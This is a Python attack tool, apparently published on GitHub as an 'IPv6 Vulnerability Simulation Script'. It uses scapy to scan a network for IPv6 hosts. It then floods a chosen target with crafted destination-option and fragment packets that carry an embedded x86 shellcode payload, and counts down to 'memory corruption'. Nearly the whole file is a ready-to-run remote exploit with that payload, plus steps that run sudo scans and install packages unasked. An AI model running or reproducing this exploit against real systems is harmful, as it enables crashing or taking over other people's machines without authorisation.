print(f'''
\033[1;34m                                                                              ,----,                                  ,--,                 
                                     ,----..                                ,/   .`|     ,----..        ,----..    ,---.'|                 
            ,---,.    .--.--.       /   /   \       ,---,                 ,`   .'  :    /   /   \      /   /   \   |   | :      .--.--.    
          ,'  .'  \  /  /    '.    /   .     :    .'  .' `\             ;    ;     /   /   .     :    /   .     :  :   : |     /  /    '.  
        ,---.' .' | |  :  /`. /   .   /   ;.  \ ,---.'     \          .'___,/    ,'   .   /   ;.  \  .   /   ;.  \ |   ' :    |  :  /`. /  
        |   |  |: | ;  |  |--`   .   ;   /  ` ; |   |  .`\  |         |    :     |   .   ;   /  ` ; .   ;   /  ` ; ;   ; '    ;  |  |--`   
        :   :  :  / |  :  ;_     ;   |  ; \ ; | :   : |  '  |         ;    |.';  ;   ;   |  ; \ ; | ;   |  ; \ ; | '   | |__  |  :  ;_     
        :   |    ;   \  \    `.  |   :  | ; | ' |   ' '  ;  :         `----'  |  |   |   :  | ; | ' |   :  | ; | ' |   | :.'|  \  \    `.  
        |   :     \   `----.   \ .   |  ' ' ' : '   | ;  .  |             '   :  ;   .   |  ' ' ' : .   |  ' ' ' : '   :    ;   `----.   \ 
        |   |   . |   __ \  \  | '   ;  \; /  | |   | :  |  '             |   |  '   '   ;  \; /  | '   ;  \; /  | |   |  ./    __ \  \  | 
        '   :  '; |  /  /`--'  /  \   \  ',  /  '   : | /  ;              '   :  |    \   \  ',  /   \   \  ',  /  ;   : ;     /  /`--'  / 
        |   |  | ;  '--'.     /    ;   :    /   |   | '` ,/               ;   |.'      ;   :    /     ;   :    /   |   ,/     '--'.     /  
        |   :   /     `--'---'      \   \ .'    ;   :  .'                 '---'         \   \ .'       \   \ .'    '---'        `--'---'   
        |   | ,'                     `---`      |   ,.'                                  `---`          `---`                              
        `----'                                  '---'                                                                                      

    Developed by https://github.com/ThemeHackers
    Developed by https://www.instagram.com/_theme.ifning/
                                                                                                                                           
\033[0m''')


import argparse
import subprocess
import sys
import pkg_resources  
from scapy.all import *
import time
import os
import threading
import psutil
import logging


def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ['scapy', 'psutil']
installed_packages = [pkg.key for pkg in pkg_resources.working_set]

for package in required_packages:
    if package not in installed_packages:
        print(f"{package} not found. Installing...")
        install_package(package)
    else:
        print(f"{package} is already installed.")
def install_v6disc():
    repo_url = "https://github.com/cvmiller/v6disc"
    clone_dir = "v6disc"
    
    if not os.path.exists(clone_dir):
        print("Cloning v6disc repository...")
        os.system(f"git clone {repo_url}")
    else:
        print("v6disc is already cloned.")

install_v6disc()
parser = argparse.ArgumentParser(description="IPv6 Vulnerability Simulation Script by HackerTheme.")
parser.add_argument("--iface", type=str, required=True, help="Network interface(s) to use for sending packets, comma-separated for multiple.")
parser.add_argument("--ipv6", type=str, help="Destination IP address (optional).")
parser.add_argument("--mac_addr", type=str, default='', help="Destination MAC address (optional).")
parser.add_argument("--num_tries", type=int, default=50, help="Number of tries per batch.")
parser.add_argument("--num_batches", type=int, default=55, help="Number of batches of tries.")
args = parser.parse_args()

ifaces = args.iface.split(',')
ipv6 = args.ipv6
mac_addr = args.mac_addr
num_tries = args.num_tries
num_batches = args.num_batches
RESET = '\033[0m'
RED = '\033[91m'
MAGENTA = '\033[95m'
GREEN = '\033[92m'
WHITE = '\033[97m'
BLUE = '\033[94m'
BOLD = '\033[1m'

def get_packets_with_mac(i):
    frag_id = 0xdebac1e + i
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / shellcode
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def get_packets(i):
    if mac_addr != '':
        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i
    first = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / shellcode
    third = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]
shellcode = (
    "\x31\xc0\x50\x68\x41\x41\x65\x22\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb8\x34\x47\x0b\x4d\xbb\x5d\x69\x6e\x35\x31\xd8\x50\xb8\x43\x32\x10\x22\xbb\x79\x6e\x51\x4e\x31\xd8\x50\xb8\x60\x05\x42\x32\xbb\x49\x78\x79\x71\x31\xd8\x50\xb8\x0f\x1c\x2c\x14\xbb\x6a\x64\x49\x33\x31\xd8\x50\xb8\x07\x3e\x0b\x40\xbb\x46\x52\x62\x6e\x31\xd8\x50\xb8\x44\x0a\x78\x07\xbb\x63\x49\x42\x5b\x31\xd8\x50\xb8\x0f\x16\x4b\x0d\xbb\x6a\x31\x67\x2d\x31\xd8\x50\xb8\x18\x62\x5c\x1f\xbb\x61\x4c\x39\x67\x31\xd8\x50\xb8\x1b\x2d\x1e\x1f\xbb\x6b\x58\x6a\x6b\x31\xd8\x50\xb8\x45\x40\x41\x66\xbb\x3d\x78\x77\x49\x31\xd8\x50\xb8\x02\x1f\x4b\x45\xbb\x6d\x6b\x38\x6a\x31\xd8\x50\xb8\x24\x3e\x19\x32\xbb\x45\x4e\x6a\x5a\x31\xd8\x50\xb8\x00\x5e\x3a\x35\xbb\x6c\x73\x49\x5b\x31\xd8\x50\xb8\x1f\x37\x40\x24\xbb\x6d\x52\x32\x41\x31\xd8\x50\xb8\x2e\x35\x68\x31\xbb\x5a\x4c\x45\x41\x31\xd8\x50\xb8\x48\x1e\x1c\x15\xbb\x67\x6e\x69\x61\x31\xd8\x50\xb8\x26\x28\x0d\x5d\xbb\x4f\x45\x62\x33\x31\xd8\x50\xb8\x20\x57\x1d\x45\xbb\x47\x78\x63\x36\x31\xd8\x50\xb8\x04\x6a\x24\x3b\xbb\x77\x44\x4b\x49\x31\xd8\x50\xb8\x18\x0f\x0a\x32\xbb\x6c\x6e\x78\x47\x31\xd8\x50\xb8\x7d\x18\x3c\x27\xbb\x52\x6c\x5d\x55\x31\xd8\x50\xb8\x03\x44\x60\x60\xbb\x77\x34\x5a\x4f\x31\xd8\x50\xb8\x47\x6b\x1f\x20\xbb\x6f\x4c\x77\x54\x31\xd8\x50\xb8\x2a\x5e\x2b\x20\xbb\x6c\x37\x47\x45\x31\xd8\x50\xb8\x59\x07\x12\x0e\xbb\x35\x68\x73\x6a\x31\xd8\x50\xb8\x01\x59\x11\x2c\xbb\x45\x36\x66\x42\x31\xd8\x50\xb8\x22\x22\x4e\x5a\xbb\x4c\x56\x67\x74\x31\xd8\x50\xb8\x00\x37\x1b\x48\xbb\x43\x5b\x72\x2d\x31\xd8\x50\xb8\x4a\x1f\x22\x13\xbb\x64\x48\x47\x71\x31\xd8\x50\xb8\x6a\x23\x03\x18\xbb\x4a\x6d\x66\x6c\x31\xd8\x50\xb8\x2d\x54\x57\x1c\xbb\x47\x31\x34\x68\x31\xd8\x50\xb8\x4e\x15\x36\x5a\xbb\x39\x38\x79\x38\x31\xd8\x50\xb8\x59\x7f\x1f\x04\xbb\x79\x57\x51\x61\x31\xd8\x50\xb8\x47\x56\x1d\x2f\xbb\x65\x70\x3d\x54\x31\xd8\x50\xb8\x2c\x18\x08\x54\xbb\x4d\x76\x6c\x74\x31\xd8\x50\xb8\x5a\x34\x58\x1b\xbb\x39\x5b\x35\x76\x31\xd8\x50\xb8\x3f\x0f\x4b\x41\xbb\x53\x63\x6b\x6c\x31\xd8\x50\xb8\x4a\x1e\x59\x0b\xbb\x38\x6d\x31\x6e\x31\xd8\x50\xb8\x49\x2b\x16\x2a\xbb\x39\x44\x61\x4f\x31\xd8\x50\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\x95\xe6\xb1\x77\xff\xd3\xbb\xcf\x2a\xae\x77\xff\xd3" 
)
def get_exploit_packet(i, shellcode , ipv6):
    frag_id = 0xdebac1e + i
    first = IPv6(dst=ipv6) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / shellcode
    third = IPv6(dst=ipv6) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def prompt_run_v6disc():
    print("\n" + "="*60)
    print("               v6disc.sh - IPv6 Discovery Script")
    print("          Developed by https://github.com/cvmiller/v6disc")
    print("="*60 + "\n")

    print("v6disc.sh is a script that typically performs IPv6 discovery operations,")
    print("such as sending ICMPv6 Neighbor Solicitation messages to identify")
    print("IPv6-enabled devices on a network. It may also be used for network")
    print("reconnaissance or as a part of penetration testing processes.\n")

    print("Please select an option:")
    print("  [y] Run v6disc.sh Advanced scan")
    print("  [o] Run v6disc.sh General scan")
    print("  [n] Skip running the script and exit\n")

    run_script = input("Your choice (y/o/n): ").lower()
    
    if run_script == 'y':
        print("\nRunning v6disc.sh Advanced scan...\n")
        os.system('sudo bash v6disc/v6disc.sh -i eth0 -L -N -D')
    elif run_script == 'o':
        print("\nRunning v6disc.sh General scan...\n")
        os.system('sudo bash v6disc/v6disc.sh -L')
    else:
        print("\nSkipping v6disc.sh...\n")
        print("Exiting...\n")
        sys.exit()
def prompt_send_dangerous_packets():
    run_packets = input("Do you want to send a dangerous package? (y/n): ").lower()
    if run_packets == 'y':
        print("Start sending packet...")
        time.sleep(2)
        print(f'Sending packets...')
        for iface in ifaces:
            sendp(final_ps, iface=iface) if mac_addr else send(final_ps, iface=iface)
    elif run_packets == 'n':
        print("Exiting program...")
        sys.exit()  
    else:
        print("Invalid input. Skipping packet sending...")
if not ipv6:
    print("Scanning network for available IPv6 addresses...")
    prompt_run_v6disc()
    time.sleep(2)  
    print("="*100 + "\n")
    ipv6 = input("No IPv6 address provided. Please enter the IPv6 address you want to use: ")
    print("="*100 + "\n")
else: 
    use_ipv6 = input(f"Do you want to use the provided IPv6 address {ipv6}? (y/n): ").lower()
    if use_ipv6 == 'n':
        ipv6 = input("Please enter the new IPv6 address: ")
    elif use_ipv6 != 'y':
        print("Invalid input. Exiting...")
        sys.exit()
final_ps = []
for _ in range(num_batches):
    for i in range(num_tries):
        final_ps += get_packets(i) + get_exploit_packet(i, shellcode, ipv6) + get_packets(i) 
if ipv6:
    prompt_send_dangerous_packets()
else:
    prompt_run_v6disc()
    prompt_send_dangerous_packets()
for i in range(60):
    print(f"Memory corruption will be triggered in {60-i} seconds", end='\r')
    time.sleep(1)
print("")
print("Scanning and monitoring completed. Exiting...")
